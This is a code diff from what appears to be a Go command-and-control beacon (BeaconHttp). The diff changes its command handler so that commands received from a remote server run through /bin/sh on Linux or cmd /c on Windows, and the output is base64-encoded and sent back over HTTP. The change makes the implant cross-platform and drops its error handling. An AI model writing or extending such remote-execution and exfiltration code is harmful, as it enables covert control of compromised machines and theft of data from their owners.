@@ -7,6 +7,7 @@ import (
 	"bytes"
 	"os/exec"
 	"strings"
+	"runtime"
 	"net/http"
 	"encoding/json"
     "mime/multipart"
@@ -51,12 +52,18 @@ func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
 func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 	for _, cmd := range commResp.Exec {
 		//cmdSplit := strings.Fields(cmd);
-		command := []string{ "-c", cmd }
-		out, err := exec.Command("/bin/sh", command...).Output()
-		debugFatal(err)
+		output := []byte{}
+		
+		if runtime.GOOS == "linux" {
+			command := []string{ "-c", cmd }
+			output, _ = exec.Command("/bin/sh", command...).Output()
+		} else if runtime.GOOS == "windows" {
+			command := []string { "/c", cmd }
+			output, _ = exec.Command("cmd", command...).Output()
+		}
 
-		if err == nil && len(out) > 0 {
-			data, err := json.Marshal(CommandUpdate{ip,id,"exec",out})
+		if len(output) > 0 {
+			data, err := json.Marshal(CommandUpdate{ip,id,"exec",output})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
